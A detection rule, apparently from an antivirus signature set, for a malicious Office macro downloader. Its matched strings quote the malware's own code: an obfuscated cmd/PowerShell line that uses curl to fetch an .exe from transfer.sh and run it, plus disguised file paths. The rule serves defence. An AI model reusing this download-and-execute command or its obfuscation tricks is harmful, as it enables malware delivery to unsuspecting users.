
rule TrojanDownloader_O97M_EncDoc_STYV_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.STYV!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {52 65 70 6c 61 63 65 28 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 67 39 38 37 36 31 72 69 63 5c 62 65 67 39 38 37 36 31 72 2e 67 39 38 37 36 31 72 6e 6b 22 2c 20 22 67 39 38 37 36 31 72 22 2c 20 22 6c 22 29 } //01 00  Replace("C:\Users\Pubg98761ric\beg98761r.g98761rnk", "g98761r", "l")
		$a_01_1 = {22 43 3a 5c 5c 55 73 65 72 73 5c 5c 50 75 62 6c 69 63 5c 5c 44 4f 43 39 39 33 32 5f 41 47 39 34 39 32 2e 65 5e 78 65 22 } //01 00  "C:\\Users\\Public\\DOC9932_AG9492.e^xe"
		$a_01_2 = {67 6f 64 6b 6e 6f 77 73 20 3d 20 52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 5e 7a 74 62 6b 62 6d 6a 38 72 73 5e 68 7a 74 62 6b 62 6d 6a 38 6c 6c 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 73 3a 2f 2f 74 72 61 6e 73 66 7a 74 62 6b 62 6d 6a 38 72 2e 73 68 2f 67 7a 74 62 6b 62 6d 6a 38 74 2f 41 54 4d 69 75 6a 2f 66 66 67 66 66 2e 7a 74 62 6b 62 6d 6a 38 5e 78 7a 74 62 6b 62 6d 6a 38 20 2d 6f 20 22 20 26 20 74 63 6b 6a 20 26 20 22 3b 22 20 26 20 74 63 6b 6a 2c 20 22 7a 74 62 6b 62 6d 6a 38 22 2c 20 22 65 22 29 } //00 00  godknows = Replace("cmd /c pow^ztbkbmj8rs^hztbkbmj8ll/W 01 c^u^rl htt^ps://transfztbkbmj8r.sh/gztbkbmj8t/ATMiuj/ffgff.ztbkbmj8^xztbkbmj8 -o " & tckj & ";" & tckj, "ztbkbmj8", "e")
	condition:
		any of ($a_*)
 
}